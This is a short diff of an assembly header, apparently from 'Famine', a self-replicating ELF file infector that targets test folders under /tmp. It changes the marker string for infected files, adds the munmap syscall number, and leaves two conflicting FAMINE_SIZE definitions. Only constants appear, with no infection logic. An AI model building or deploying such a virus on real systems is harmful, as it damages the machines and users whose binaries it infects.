@@ -3,13 +3,15 @@
 
 %define FOLDER_1 "/tmp/test/"
 %define FOLDER_2 "/tmp/test2/"
-%define TMP ".mimic.famine"
+%define TMP "infected"
 
 %define FILE_SIZE 256
 %define DIRENT 1024
 %define FSTAT 144
 %define MAPPED_FILE 8
 
+
+%define FAMINE_SIZE _v_stop - _famine
 %define FAMINE_SIZE _end - _famine
 
 ; ELF_HDR_DEFINITION
@@ -27,6 +29,7 @@
 %define SYS_OPEN 2
 %define SYS_CLOSE 3
 %define SYS_FSTAT 5
+%define SYS_MUNMAP 11
 %define SYS_EXIT 60
 %define SYS_GETDENTS 217
 
